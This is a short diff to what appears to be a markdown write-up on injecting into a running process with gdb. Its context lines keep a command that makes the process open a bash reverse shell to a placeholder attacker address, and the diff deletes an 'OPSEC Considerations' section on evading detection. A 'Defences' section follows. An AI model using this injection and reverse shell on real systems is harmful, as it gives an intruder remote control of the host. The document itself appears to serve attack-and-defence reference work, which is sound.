@@ -51,10 +51,6 @@ gdb -p <PID>
 call (void)system("bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1'")
 ```
 
-## OPSEC Considerations
-
-Directly installing debugging tools makes the attack easy, but provides easy detections for defenders. Use a custom script to inject into the target process to raise the bar for detection.
-
 ## Defences
 
 ### Monitoring
